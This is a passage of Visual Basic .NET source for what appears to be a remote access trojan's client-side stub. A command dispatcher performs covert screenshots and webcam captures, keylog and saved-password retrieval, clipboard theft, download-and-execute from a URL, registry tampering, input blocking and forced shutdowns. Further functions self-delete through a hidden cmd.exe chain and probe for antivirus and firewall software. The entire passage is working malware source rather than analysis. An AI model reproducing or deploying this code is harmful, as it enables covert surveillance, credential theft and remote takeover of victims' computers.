                    DebugToConsole("Command: Changing window title...", DebugStatus.Pending)
                    Dim Title() As String = Split(CStr(ReadData()), ";;;")
                    Try
                        SetText(CType(Title(0), IntPtr), Title(1))
                        DebugToConsole("Window title changed to: " & Title(1), DebugStatus.Success)
                        WriteResponse("22")
                    Catch ex As Exception
                        DebugToConsole("failed changing window title.", DebugStatus.Failed)
                        WriteResponse("22x1")
                    End Try
                    CleanCommand()
                Case "23"
                    DebugToConsole("Command: Listing Drives...", DebugStatus.Pending)
                    WriteData(ListDrives)
                    DebugToConsole("Drives listed with success", DebugStatus.Success)
                    WriteResponse("23")
                    CleanCommand()
                Case "24"
                    Dim FilePath As String = CStr(ReadData())
                    DebugToConsole("Command: Listing Files and Folders in " & FilePath, DebugStatus.Pending)
                    Try
                        WriteData(FormatDirectoryData(FilePath) & "|||||" & FormatFileData(FilePath))
                        WriteResponse("24")
                        DebugToConsole("Files and folders listed with success.", DebugStatus.Success)
                    Catch ex As UnauthorizedAccessException
                        DebugToConsole("Failed listing files and folders. Access is denied.", DebugStatus.Failed)
                        WriteResponse("24x1")
                    Catch ex2 As Exception
                        DebugToConsole("Failed listing files and folders.", DebugStatus.Failed)
                        WriteResponse("24x2")
                    End Try
                    CleanCommand()
                Case "25"
                    Dim Folderpath As String = CStr(ReadData())
                    DebugToConsole("Command: Deleting directory " & Folderpath & " ...", DebugStatus.Pending)
                    If DeleteFolder(Folderpath) = 1 Then
                        DebugToConsole("Deleted directory " & Folderpath & " with success.", DebugStatus.Success)
                        WriteResponse("25")
                    ElseIf DeleteFolder(Folderpath) = 2 Then
                        DebugToConsole("Failed deleting directory " & Folderpath & ". Access is denied.", DebugStatus.Failed)
                        WriteResponse("25x1")
                    ElseIf DeleteFolder(Folderpath) = 3 Then
                        DebugToConsole("Failed deleting directory " & Folderpath & ".", DebugStatus.Failed)
                        WriteResponse("25x2")
                    End If
                    CleanCommand()
                Case "26"
                    Dim Foldername As String = CStr(ReadData())
                    DebugToConsole("Command: Opening directory " & Foldername & " ...", DebugStatus.Pending)
                    Try
                        Process.Start(Foldername)
                        WriteResponse("26")
                    Catch
                        WriteResponse("26x1")
                    End Try
                    CleanCommand()
                Case "27"
                    Dim RenameDirData As String = CStr(ReadData())
                    Dim RenameInfos() As String = Nothing
                    Try
                        RenameInfos = Split(RenameDirData, "|||")
                    Catch
                        DebugToConsole("Failed formatting information for renaming directory. Retry.", DebugStatus.Failed)
                    End Try
                    DebugToConsole("Command: Renaming directory " & RenameInfos(0) & " to " & RenameInfos(1), DebugStatus.Pending)
                    Try
                        FileIO.FileSystem.RenameDirectory(RenameInfos(0), RenameInfos(1))
                        WriteResponse("27")
                    Catch ex As Exception
                        DebugToConsole("Failed renaming directory. Reason: " & ex.Message, DebugStatus.Failed)
                        WriteResponse("27x1")
                    End Try
                    CleanCommand()
                Case "28"
                    Dim DirectoryName As String = CStr(ReadData())
                    DebugToConsole("Command: Create directory " & DirectoryName, DebugStatus.Pending)
                    If CreateDirectory(DirectoryName) = 1 Then
                        DebugToConsole("Directory created with success", DebugStatus.Success)
                        WriteResponse("28")
                    ElseIf CreateDirectory(DirectoryName) = 2 Then
                        DebugToConsole("Failed creating Directory. Access is denied.", DebugStatus.Failed)
                        WriteResponse("28x1")
                    ElseIf CreateDirectory(DirectoryName) = 3 Then
                        DebugToConsole("Failed creating Directory.", DebugStatus.Failed)
                        WriteResponse("28x2")
                    End If
                    CleanCommand()

                Case "29"
                    Dim Filepath As String = CStr(ReadData())
                    DebugToConsole("Command: Delete File " & Filepath, DebugStatus.Pending)
                    Try
                        File.Delete(Filepath)
                        DebugToConsole("File deleted with success.", DebugStatus.Success)
                        WriteResponse("29")
                    Catch ex As UnauthorizedAccessException
                        DebugToConsole("Failed deleting file. Access is denied.", DebugStatus.Failed)
                        WriteResponse("29x1")
                    Catch ex2 As Exception
                        DebugToConsole("Failed deleting file.", DebugStatus.Failed)
                        WriteResponse("29x2")
                    End Try
                    CleanCommand()
                Case "30"
                    Dim RenameFile As String = CStr(ReadData())
                    Dim RenameParts() As String = Split(RenameFile, "|||")
                    DebugToConsole("Command: Rename File " & RenameParts(0) & " to " & RenameParts(1), DebugStatus.Pending)
                    Try
                        My.Computer.FileSystem.RenameFile(RenameParts(0), RenameParts(1))
                        DebugToConsole("File renamed with success.", DebugStatus.Success)
                        WriteResponse("30")
                    Catch ex As UnauthorizedAccessException
                        DebugToConsole("Failed renaming file. Access is denied.", DebugStatus.Failed)
                        WriteResponse("30x1")
                    Catch ex2 As Exception
                        DebugToConsole("Failed renaming file.", DebugStatus.Failed)
                        WriteResponse("30x2")
                    End Try
                    CleanCommand()
                Case "31"
                    Dim Filepath As String = CStr(ReadData())
                    DebugToConsole("Command: Get Fileinfo for " & Filepath, DebugStatus.Pending)
                    WriteData(GetFileInfo(Filepath))
                    WriteResponse("31")
                    DebugToConsole("Fileinfo recieved with success.", DebugStatus.Success)
                    CleanCommand()
                Case "32"
                    Try
                        Dim ScreenSettings() As String = Split(ReadData, "|")
                        DebugToConsole("Command: Taking Screenshot...", DebugStatus.Pending)
                        If ScreenSettings(1).Contains("0") Then
                            WriteDataNoEncryption(ScreenshotToHex(CType(Screenshot(CInt(ScreenSettings(0))), Bitmap)))
                        Else
                            WriteDataNoEncryption(ScreenshotToHex(CType(ScreenshotStamp(CInt(ScreenSettings(0)), My.Computer.Name.ToString & " / " & Environment.UserName), Bitmap)))
                        End If

                        WriteResponse("32")
                        DebugToConsole("Screenshot taken with success.", DebugStatus.Success)

                    Catch
                        DebugToConsole("Failed taking screenshot.", DebugStatus.Failed)
                        WriteResponse("32x1")
                    End Try
                    CleanCommand()
                Case "33"
                    DebugToConsole("Command: Listing webcam devices...", DebugStatus.Pending)
                    If Webcam.GetWebcamDeviceNames() = Nothing Then
                        WriteResponse("33x1")
                        DebugToConsole("No webcams available.", DebugStatus.Failed)
                    Else
                        WriteData(Webcam.GetWebcamDeviceNames)
                        WriteResponse("33")
                        DebugToConsole(CType(Webcam.CountWebcamDevices(), String) & " webcam device(s) recieved with success", DebugStatus.Success)
                    End If
                    CleanCommand()
                Case "34"
                    Dim Device As String = CStr(ReadData())
                    DebugToConsole("Command: Taking webcam snapshot from device " & Device, DebugStatus.Pending)
                    Dim WebcamImageString As String = Nothing
                    Try
                        WebcamImageString = Webcam.TakeWebcamSnapshot(CType(Device, Integer))
                        If String.IsNullOrEmpty(WebcamImageString) Then
                            DebugToConsole("Failed taking webcam snapshot", DebugStatus.Failed)
                            WriteResponse("34x1")
                        Else
                            WriteDataNoEncryption(WebcamImageString)
                            DebugToConsole("Webcam snapshot taken with success", DebugStatus.Success)
                            WriteResponse("34")
                        End If
                    Catch
                        DebugToConsole("Failed taking webcam snapshot", DebugStatus.Failed)
                        WriteResponse("34x1")
                    End Try
                    CleanCommand()
                Case "35"
                    Dim ExecuteFile As String = ReadData()
                    DebugToConsole("Command: Execute File: " & ExecuteFile, DebugStatus.Pending)
                    Try
                        Process.Start(ExecuteFile)
                        WriteResponse("35")
                        DebugToConsole("File executed with success", DebugStatus.Success)
                    Catch
                        WriteResponse("35x1")
                        DebugToConsole("Filed executing file.", DebugStatus.Failed)
                    End Try
                    CleanCommand()

                Case "36"
                    Try
                        Dim RegistryPath As String = ReadData()
                        Dim RegistryData() As String = Split(RegistryPath, "|||")
                        DebugToConsole("Enumerating Registrykeys / Registryvalues in " & ReplaceFirstOccurrance(RegistryPath, "|||", String.Empty), DebugStatus.Pending)
                        Dim RegData As String = ListRegistryKeys(RegistryData(0), RegistryData(1)) & "~~~~~" & ListRegistryValues(RegistryData(0), RegistryData(1))
                        WriteData(RegData)
                        WriteResponse("36")
                        DebugToConsole("Registrykeys/Registryvalues listed with success.", DebugStatus.Success)
                    Catch ex As Exception
                        WriteResponse("36x1")
                        DebugToConsole("Failed listing Registrykeys/Registryvalues.", DebugStatus.Failed)
                    End Try
                    CleanCommand()

                Case "37"
                    Dim NewKey As String = ReadData()
                    Dim NewValue As String() = Split(NewKey, "|||")
                    DebugToConsole("Creating new Registryvalue " & NewValue(1), DebugStatus.Pending)
                    If RegSetCreateValue(NewValue(0), NewValue(1), NewValue(2)) = True Then
                        WriteResponse("37")
                        DebugToConsole("Registryvalue created with success.", DebugStatus.Success)
                    Else
                        WriteResponse("37x1")
                        DebugToConsole("Failed creating Registryvalue.", DebugStatus.Failed)
                    End If
                    CleanCommand()
                Case "38"
                    Dim DeleteValue As String = ModuleMain.ReadData
                    Dim FormattedValue() As String = Split(DeleteValue, "|||")
                    DeleteReyKeyValue(FormattedValue(0), FormattedValue(1))
                    WriteResponse("38")
                    DebugToConsole("Deleted Registryvalue.", DebugStatus.Success)
                    CleanCommand()
                Case "39"
                    Dim NewValue As String = ReadData()
                    Dim Modified() As String = Split(NewValue, "|||")
                    If SetReyKeyValue(Modified(0), Modified(1), Modified(2)) = True Then
                        WriteResponse("39")
                        DebugToConsole("Modified Registryvalue.", DebugStatus.Success)
                    Else
                        WriteResponse("39x1")
                        DebugToConsole("Failed modifying Registryvalue.", DebugStatus.Failed)
                    End If
                    CleanCommand()

                Case "40"
                    DebugToConsole("Grabbing network taffic.", DebugStatus.Pending)
                    Try
                        WriteData(ReturnAllConnections)
                        WriteResponse("40")
                        DebugToConsole("Active network traffic sent to client.", DebugStatus.Success)
                    Catch
                        WriteResponse("40x1")
                        DebugToConsole("Failed grabbing network traffic.", DebugStatus.Failed)
                    End Try
                    CleanCommand()

                Case "41"
                    DebugToConsole("Hiding Taskbar...", DebugStatus.Pending)
                    HideTaskbar()
                    DebugToConsole("Taskbar hidden.", DebugStatus.Success)
                    WriteResponse("41")
                    CleanCommand()
                Case "42"
                    DebugToConsole("Showing Taskbar...", DebugStatus.Pending)
                    ShowTaskbar()
                    DebugToConsole("Taskbar shown.", DebugStatus.Success)
                    WriteResponse("42")
                    CleanCommand()
                Case "43"
                    DebugToConsole("Hiding clock...", DebugStatus.Pending)
                    HideClock()
                    DebugToConsole("Clock hidden.", DebugStatus.Success)
                    WriteResponse("43")
                    CleanCommand()
                Case "44"
                    DebugToConsole("Showing clock...", DebugStatus.Pending)
                    ShowClock()
                    DebugToConsole("Clock shown.", DebugStatus.Success)
                    WriteResponse("44")
                    CleanCommand()
                Case "45"
                    DebugToConsole("Locking taskbar...", DebugStatus.Pending)
                    LocktaskBar()
                    DebugToConsole("Taskbar locked.", DebugStatus.Success)
                    WriteResponse("45")
                    CleanCommand()
                Case "46"
                    DebugToConsole("Unlocking taskbar...", DebugStatus.Pending)
                    UnlocktaskBar()
                    DebugToConsole("Taskbar unlocked.", DebugStatus.Success)
                    WriteResponse("46")
                    CleanCommand()
                Case "47"
                    DebugToConsole("Hiding Desktop Icons...", DebugStatus.Pending)
                    HideDesktopIcons()
                    DebugToConsole("Desktop Icons hidden.", DebugStatus.Success)
                    WriteResponse("47")
                    CleanCommand()
                Case "48"
                    DebugToConsole("Showing Desktop Icons...", DebugStatus.Pending)
                    ShowDesktopIcons()
                    DebugToConsole("Desktop Icons shown.", DebugStatus.Success)
                    WriteResponse("48")
                    CleanCommand()
                Case "49"
                    DebugToConsole("Blocking Mouse/Keyboard...", DebugStatus.Pending)
                    If IsElevatedProcess() = True Then
                        Win32.BlockInput(True)
                        WriteResponse("49")
                        DebugToConsole("Mouse/Keyboard blocked.", DebugStatus.Success)
                    Else
                        DebugToConsole("Can't block Mouse/Keyboard. Access is denied.", DebugStatus.Failed)
                        WriteResponse("49x1")
                    End If
                    CleanCommand()
                Case "50"
                    DebugToConsole("Unblocking Mouse/Keyboard...", DebugStatus.Pending)
                    If IsElevatedProcess() = True Then
                        Win32.BlockInput(False)
                        WriteResponse("50")
                        DebugToConsole("Mouse/Keyboard unblocked.", DebugStatus.Success)
                    Else
                        DebugToConsole("Can't unblock Mouse/Keyboard. Access is denied.", DebugStatus.Failed)
                        WriteResponse("50x1")
                    End If
                    CleanCommand()
                Case "51"
                    DebugToConsole("Swapping mouse buttons...", DebugStatus.Pending)
                    Win32.SwapMouseButton(CType(&H100&, IntPtr))
                    DebugToConsole("Mouse buttons swapped.", DebugStatus.Success)
                    WriteResponse("51")
                    CleanCommand()
                Case "52"
                    DebugToConsole("Restoring mouse buttons...", DebugStatus.Pending)
                    Win32.SwapMouseButton(CType(&H0&, IntPtr))
                    DebugToConsole("Mouse buttons restored.", DebugStatus.Success)
                    WriteResponse("52")
                    CleanCommand()
                Case "53"
                    DebugToConsole("Shutting down computer...", DebugStatus.Pending)
                    Disconnect()
                    WriteResponse("53")
                    PowerOptions(&H4 + &H1)
                    CleanCommand()
                Case "54"
                    DebugToConsole("Rebooting down computer...", DebugStatus.Pending)
                    Disconnect()
                    WriteResponse("54")
                    PowerOptions(&H4 + &H2)
                    CleanCommand()
                Case "55"
                    DebugToConsole("Logging off computer...", DebugStatus.Pending)
                    Disconnect()
                    WriteResponse("55")
                    PowerOptions(&H4 + &H0)
                    CleanCommand()
                Case "56"
                    DebugToConsole("Launching Screensaver...", DebugStatus.Pending)
                    StartScreenSaver()
                    WriteResponse("56")
                    DebugToConsole("Screensaver started.", DebugStatus.Success)
                    CleanCommand()
                Case "57"
                    DebugToConsole("Opening disk tray...", DebugStatus.Pending)
                    OpenCDTray()
                    DebugToConsole("Disk tray opened...", DebugStatus.Success)
                    WriteResponse("57")
                    CleanCommand()
                Case "58"
                    DebugToConsole("Closing disk tray...", DebugStatus.Pending)
                    CloseCDTray()
                    DebugToConsole("Disk tray closed...", DebugStatus.Success)
                    WriteResponse("58")
                    CleanCommand()
                Case "59"
                    Dim MsgBoxInfo As String = ReadData()
                    Dim MsgBoxParts() As String = Split(MsgBoxInfo, "|||")
                    DebugToConsole("Showing MessageBox...", DebugStatus.Pending)
                    Dim MsgBoxThread As New Thread(Sub() ShowMessageBox(MsgBoxParts(0), MsgBoxParts(1), ChooseIcon(MsgBoxParts(2)), ChooseButtons(MsgBoxParts(3))))
                    MsgBoxThread.SetApartmentState(Threading.ApartmentState.STA)
                    MsgBoxThread.Start()
                    DebugToConsole("MessageBox has been shown.", DebugStatus.Success)
                    WriteResponse("59")
                    CleanCommand()
                Case "60"
                    Dim Text As String = ReadData()
                    DebugToConsole("Changing clipboard text...", DebugStatus.Pending)
                    ClipboardSetText(Text)
                    DebugToConsole("Clipboardtext has been set.", DebugStatus.Success)
                    WriteResponse("60")
                    CleanCommand()
                Case "61"
                    DebugToConsole("Grabbing clipboard text...", DebugStatus.Pending)
                    WriteData(ClipboardGetText)
                    DebugToConsole("Clipboardtext recieved.", DebugStatus.Success)
                    WriteResponse("61")
                    CleanCommand()
                Case "62"
                    DebugToConsole("Grabbing installed software...", DebugStatus.Pending)
                    WriteData(GetSoftwareList)
                    DebugToConsole("Installed software recieved.", DebugStatus.Success)
                    WriteResponse("62")
                    CleanCommand()
                Case "63"
                    DebugToConsole("Getting saved passwords...", DebugStatus.Pending)
                    WriteData(GetAllPasswords)
                    DebugToConsole("Saved passwords recieved.", DebugStatus.Success)
                    WriteResponse("63")
                    CleanCommand()
                Case "64"
                    DebugToConsole("Getting keylogs...", DebugStatus.Pending)
                    WriteData(GetKeylogs)
                    DebugToConsole("keylogs recieved with success.", DebugStatus.Success)
                    WriteResponse("64")
                    CleanCommand()
                Case "65"
                    Dim DownloadInformation() As String = Split(ReadData, "|||")
                    DebugToConsole("Downloading file from url...", DebugStatus.Pending)
                    Try
                        DownloadAndExecute(DownloadInformation(0), DownloadInformation(1))
                        WriteResponse("65")
                        DebugToConsole("Download of file has been started.", DebugStatus.Success)
                    Catch
                        WriteResponse("65x1")
                        DebugToConsole("Failed downloading file.", DebugStatus.Failed)
                    End Try
                    CleanCommand()
                Case "66"
                    DebugToConsole("Getting startup Programs...", DebugStatus.Pending)
                    WriteData(GetStartupPrograms())
                    DebugToConsole("Startup Programs listed.", DebugStatus.Success)
                    WriteResponse("66")
                    CleanCommand()

                Case "67"
                    Dim Parameters As String = ReadData()
                    DebugToConsole("Removing startup Program...", DebugStatus.Pending)
                    RemoveStartupProgram(Parameters)
                    DebugToConsole("Startup Programs listed.", DebugStatus.Success)
                    WriteResponse("67")
                    CleanCommand()
                Case "68"

                    Dim DownloadFileUrl As String = ReadData()
                    DebugToConsole("Downloading file : " & DownloadFileUrl, DebugStatus.Pending)
                    StartUpload(DownloadFileUrl)
                    CleanCommand()
                Case "69"
                    Dim RecordDuration As String = ReadData()
                    While RecordDuration >= 0
                        DebugToConsole(String.Format("Recording microphone for {0} seconds...", RecordDuration), DebugStatus.Pending)
                        RecordDuration -= 1
                        Threading.Thread.Sleep(1000)
                    End While
                Case "98"
                    DebugToConsole("Command: Reboot all computers. Sending No Response.", DebugStatus.Pending)
                    Disconnect()
                    PowerOptions(&H4 + &H2)
                Case "99"
                    DebugToConsole("Command: Uninstall all Bots. Sending No Response.", DebugStatus.Pending)
                    Disconnect()
                    UninstallServer()
                Case Else
                    DebugToConsole("Command: Unknown Command", DebugStatus.Failed)
                    CleanCommand()
            End Select
        End If
    End Sub
#End Region

#Region "Command - Restart Elevated"
    Friend Sub RestartElevated()
        Dim startInfo As New ProcessStartInfo()
        startInfo.UseShellExecute = True
        startInfo.WorkingDirectory = Environment.CurrentDirectory
        startInfo.FileName = Application.ExecutablePath
        startInfo.Verb = "runas" 'here?
        Try
            Dim p As Process = Process.Start(startInfo)
        Catch ex As System.ComponentModel.Win32Exception
            Return
        End Try
        End
    End Sub

#End Region

#Region "Command - Melt"
    Public Sub UninstallServer()

        Try
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\settings.dat") Then
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\settings.dat")
            End If
        Catch
        End Try
        Dim FileName As String = Application.ExecutablePath
        Dim Success As Boolean = Win32.MoveFileEx(FileName, Nothing, 4)

        Dim Name As String = Path.GetFileName(FileName)
        Dim C1 As String = "taskkill /f /im"
        Dim C2 As String = "ping -n 1 -w 3000 1.1.1.1"
        Dim C3 As String = "type nul >"
        Dim C4 As String = "del /f /q"

        Dim CMD As String = String.Format("/C {0} ""{4}"" & {1} & {2} ""{5}"" & {3} ""{5}""", C1, C2, C3, C4, Name, FileName)

        Dim PI As New ProcessStartInfo("cmd.exe", CMD)
        PI.WindowStyle = ProcessWindowStyle.Hidden

        Process.Start(PI).WaitForExit(3500)
        'If CMD fails the code below will be executed.

        If Success Then
            Dim Token As IntPtr
            Dim Handle As IntPtr = Process.GetCurrentProcess.Handle

            If Not Win32.OpenToken(Handle, 40, Token) Then Return

            Dim TP As Win32.TokenPrivilege
            TP.Count = 1
            TP.Flags = 2

            If Not Win32.GetPrivilegeID(Nothing, "SeShutdownPrivilege", TP.LUID) Then Return
            If Not Win32.SetPrivilege(Token, False, TP, 0, IntPtr.Zero, IntPtr.Zero) Then Return
            Win32.ShutdownEx(Nothing, Nothing, 0, True, True, 327699)
        End If

    End Sub
#End Region

#Region "Command - Processmanager"

    Private Function ListProcesses() As String
        Dim ProcessString As String = Nothing
        For Each Prc As Process In Process.GetProcesses
            Dim CurrentProcess As Process = Process.GetCurrentProcess
            If CurrentProcess.Id = Prc.Id Then
                ProcessString &= Prc.ProcessName & ".exe|||" & Prc.Id & "*;;;"
            Else
                ProcessString &= Prc.ProcessName & ".exe|||" & Prc.Id & ";;;"
            End If
        Next
        Return ProcessString
    End Function

    Private Function StartProcess(ByVal Processname As String) As Boolean
        Try
            Process.Start(Processname)
            DebugToConsole("Started " & Processname & " with success.", DebugStatus.Success)
            Return True
        Catch ex As Exception
            DebugToConsole("Unable to start Process: " & ex.Message, DebugStatus.Failed)
            Return False
        End Try
        Return False
    End Function

    Private Function TerminateProcess(ByVal ID As Integer) As Boolean
        For Each P As Process In Process.GetProcesses
            If P.Id = ID Then
                Try
                    P.Kill()
                    DebugToConsole("Process killed successfully", DebugStatus.Success)
                    Return True
                Catch ex As Exception
                    DebugToConsole("Failed to kill Process.", DebugStatus.Failed)
                    Return False
                End Try
            End If
        Next
        Return True
    End Function

    Private Function ListModules(ByVal PID As Integer) As String
        Dim ModuleString As String = Nothing
        Try
            Dim p As Process = Process.GetProcessById(PID)
            For Each PrcModules As ProcessModule In p.Modules
                ModuleString &= PrcModules.ModuleName & "|||"
            Next
            Return ModuleString
        Catch
            Return "8x1"
        End Try
    End Function

#End Region

#Region "Command - Servicemanager"
    Dim Resultmsg As String
    Public Enum ReturnValue
        Success = 0
        NotSupported = 1
        AccessDenied = 2
        DependentServicesRunning = 3
        InvalidServiceControl = 4
        ServiceCannotAcceptControl = 5
        ServiceNotActive = 6
        ServiceRequestTimeout = 7
        UnknownFailure = 8
        PathNotFound = 9
        ServiceAlreadyRunning = 10
        ServiceDatabaseLocked = 11
        ServiceDependencyDeleted = 12
        ServiceDependencyFailure = 13
        ServiceDisabled = 14
        ServiceLogonFailure = 15
        ServiceMarkedForDeletion = 16
        ServiceNoThread = 17
        StatusCircularDependency = 18
        StatusDuplicateName = 19
        StatusInvalidName = 20
        StatusInvalidParameter = 21
        StatusInvalidServiceAccount = 22
        StatusServiceExists = 23
        ServiceAlreadyPaused = 24
        ServiceNotFound = 25
    End Enum

    Private Function StartService(ByVal Servicename As String) As Boolean
        If IsElevatedProcess() = True Then
            If StartSvc(Servicename) = 0 Then
                DebugToConsole("Started service " & Servicename & " with success.", DebugStatus.Success)
                Return True
            Else
                DebugToConsole("Failed starting service " & Servicename & ". Errorcode: " & Resultmsg, DebugStatus.Failed)
                Return False
            End If
        End If
        Return False
    End Function

    Private Function IsElevatedProcess() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        Return isElevated
    End Function

    Public Function StartSvc(svcName As String) As ReturnValue
        Dim objPath As String = String.Format("Win32_Service.Name='{0}'", svcName)
        Using service As New ManagementObject(New ManagementPath(objPath))
            Try
                Dim outParams As ManagementBaseObject = service.InvokeMethod("StartService", Nothing, Nothing)
                Return DirectCast([Enum].Parse(GetType(ReturnValue), outParams("ReturnValue").ToString()), ReturnValue)
                Resultmsg = CStr(0)
            Catch ex As Exception
                If ex.Message.ToLower().Trim() = "not found" OrElse ex.GetHashCode() = 41149443 Then
                    Return ReturnValue.ServiceNotFound
                    Resultmsg = CStr(ReturnValue.ServiceNotFound)
                Else
                    DebugToConsole("Unknown Exception occured while starting a service.", DebugStatus.Failed)
                    Resultmsg = "Unknown Service Error."
                End If
            End Try
        End Using
        Return CType(Resultmsg, ReturnValue)
    End Function

    Public Function StopSvc(svcName As String) As ReturnValue
        Dim objPath As String = String.Format("Win32_Service.Name='{0}'", svcName)
        Using service As New ManagementObject(New ManagementPath(objPath))
            Try
                Dim outParams As ManagementBaseObject = service.InvokeMethod("StopService", Nothing, Nothing)

                Return DirectCast([Enum].Parse(GetType(ReturnValue), outParams("ReturnValue").ToString()), ReturnValue)
            Catch ex As Exception
                If ex.Message.ToLower().Trim() = "not found" OrElse ex.GetHashCode() = 41149443 Then
                    Return ReturnValue.ServiceNotFound
                Else
                    DebugToConsole("Unknown Exception occured while stopping a service.", DebugStatus.Failed)
                End If
            End Try
        End Using
        Return ReturnValue.UnknownFailure
    End Function

    Public Function CanStop(svcName As String) As Boolean
        Dim objPath As String = String.Format("Win32_Service.Name='{0}'", svcName)
        Using service As New ManagementObject(New ManagementPath(objPath))
            Try
                Return Boolean.Parse(service.Properties("AcceptStop").Value.ToString())
            Catch
                Return False
            End Try
        End Using
    End Function


    Public Function GetSvcPath(svcName As String) As String
        Dim objPath As String = String.Format("Win32_Service.Name='{0}'", svcName)
        Using service As New ManagementObject(New ManagementPath(objPath))
            Try
                Return service.Properties("PathName").Value.ToString()
            Catch
                Return "N/A"
            End Try
        End Using
    End Function

    Private Function EnumerateServices() As String
        Dim localServices() As ServiceController = ServiceController.GetServices
        Dim ServiceString As String = Nothing
        For i = 0 To UBound(localServices)
            Dim StateName As String = CStr(localServices(i).Status)
            Select Case StateName
                Case CStr(4)
                    StateName = "Running"
                Case CStr(1)
                    StateName = "Stopped"
                Case Else
                    StateName = "Unknown"
            End Select
            ServiceString &= localServices(i).ServiceName & "|||" & localServices(i).DisplayName & "|||" & StateName & ";;;"
        Next
        Return ServiceString
    End Function

#End Region

#Region "Command - Systeminformation"

    Private Function WebcamAvailable() As String
        Try
            If Webcam.CountWebcamDevices() = 0 Then
                Return "No"
            Else
                Return "Yes (" & CType(Webcam.CountWebcamDevices(), String) & ")"
            End If
        Catch
            Return "No"
        End Try
    End Function
    Private Function SystemInfo() As String
        Return "Username: " & Environment.UserName & "|||Computername: " & My.Computer.Name & "|||Operating System: " & My.Computer.Info.OSFullName & "|||Country: " & RegionInfo.CurrentRegion.EnglishName & "|||Privileges: " & GetPrivileges() & "|||Screen Resolution: " & GetScreenResolution() & "|||Bitsystem: " & Win32.GetOSArchitecture() & "|||RAM: " & GetRAM() & "|||Processor: " & GetProcessor() & "|||Graphics Card: " & GetVideocard() & "|||Time Since Last Reboot: " & TimeSinceLastReboot() & "|||AntiVirus Software: " & GetAntivirus() & "|||Firewall: " & GetFirewall() & "|||Webcam: " & WebcamAvailable()
    End Function
    Private Function GetScreenResolution() As String
        Dim ScreenSize As String = Screen.PrimaryScreen.Bounds.Width.ToString & " x " & Screen.PrimaryScreen.Bounds.Height.ToString
        Return ScreenSize
    End Function
    Private Function TimeSinceLastReboot() As String
        On Error Resume Next
        Dim UpTime As Double = My.Computer.Clock.TickCount / 1000 / 60
        Return CInt(UpTime).ToString() & " minutes"
    End Function
    Public Function GetAntivirus() As String
        Try
            Dim data As String = String.Empty
            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM AntiVirusProduct").Get
                data &= firewall("displayName").ToString
            Next
            If Not data = String.Empty Then
                Return data
            Else
                Return "No Antivirus"
            End If
        Catch
            Return "No Antivirus"
        End Try
    End Function

    Public Function GetFirewall() As String
        Try
            Dim data As String = String.Empty
            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM FirewallProduct").Get
                data &= firewall("displayName").ToString
            Next
            If Not data = String.Empty Then
                Return data
            Else
                Return "No Firewall"
            End If
        Catch
            Return "No Firewall"""
        End Try
    End Function

    Function WMI(ByVal wmiclass As String, Optional ByVal value As String = "Caption") As String
        Try
            Dim data As String = String.Empty
            For Each obj As ManagementObject In New ManagementObjectSearcher("SELECT " & value & " FROM Win32_" & wmiclass).Get()
                data &= obj(value).ToString & ","
            Next
            Return data.Trim(CChar(","))
        Catch ex As Exception
            Return String.Empty
        End Try
    End Function

    Private Function GetVideocard() As String
        Try
            Dim infoOut As String = Nothing
            Dim searcher As New ManagementObjectSearcher("SELECT name FROM Win32_VideoController")
            Dim objCol As ManagementObjectCollection = searcher.[Get]()
            For Each mgtObject As ManagementObject In objCol
                infoOut += mgtObject("name").ToString()
            Next
            Return infoOut
        Catch
            Return "N/A"
        End Try
        Return "N/A"
    End Function
    Private Function GetProcessor() As String
        Try
            Dim infoOut As String = Nothing
            Dim searcher As New ManagementObjectSearcher("SELECT name FROM Win32_Processor")
            Dim objCol As ManagementObjectCollection = searcher.[Get]()
            For Each mgtObject As ManagementObject In objCol
                infoOut += mgtObject("name").ToString()
            Next
            Return infoOut
        Catch
            Return "N/A"
        End Try
        Return "N/A"
    End Function

    Public Function GetPrivileges() As String
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        If isElevated = True Then
            Return "Admin (Full)"
        Else
            Return "Standart (Limited)"
        End If
        Return "Standart (Limited)"
    End Function
    Private Function GetRAM() As String
        Return String.Format("{0} MB", System.Math.Round(My.Computer.Info.TotalPhysicalMemory / (1024 * 1024)), 2).ToString
    End Function

#End Region

#Region "Command - Serverinformation"

    Private Function GetServerInformation() As String
        Dim CProcess As Process = Process.GetCurrentProcess()
        Return "Processname: " & CProcess.ProcessName & ".exe" & "|||Memory Usage: " & (CProcess.WorkingSet64 / 1024).ToString & " K" & "|||Executable Path: " & Application.ExecutablePath & "|||Autostart at reboot: " & Settings.StubInstall & "|||Unique ID: " & UniqueID & "|||Protected Process: " & Settings.StubProcessSecurity & "|||Privileges: " & IsElevatedProcess() & "|||Visible Mode: " & StealthMode & "|||Hosting URL: " & HostAdress
    End Function

#End Region

#Region "Command - Windowmanager"

    Private Function EnumerateWindows() As String
        Dim Test As String = Nothing
        For Each item As String In GetWindows()
            Test &= item
        Next
        Return Test
    End Function
    Public Function GetWindows() As List(Of String)
        Dim VisibleWindow As String = Nothing
        Dim inVisibleWindow As String = Nothing
        Dim hwndlist As New List(Of String)
        Win32.ActiveWindows.Clear()
        For Each i In GetActiveWindows()
            Dim windtitle As String = GetWindowtitle(i).Trim(Chr(0))
            If Not windtitle = Nothing Then
                If Win32.IsWindowVisible(i) Then
                    hwndlist.Add(i.ToString & "|||" & GetWindowState(i) & "|||" & GetWindowtitle(i) & ";;;")
                End If
            End If
        Next
        Return hwndlist
    End Function
    Public Function GetWindowtitle(ByVal hwnd As IntPtr) As String
        Dim Text As New StringBuilder(UShort.MaxValue)
        Win32.GetWindowText(hwnd, Text, CInt(Short.MaxValue))
        Return Text.ToString
    End Function
    Public Function GetActiveWindows() As ObjectModel.Collection(Of IntPtr)
        Win32.EnumWindows(AddressOf Enumerator, CType(0, IntPtr))
        Return Win32.ActiveWindows
    End Function
    Private Function Enumerator(ByVal Hwnd As IntPtr, ByVal lParam As IntPtr) As Boolean
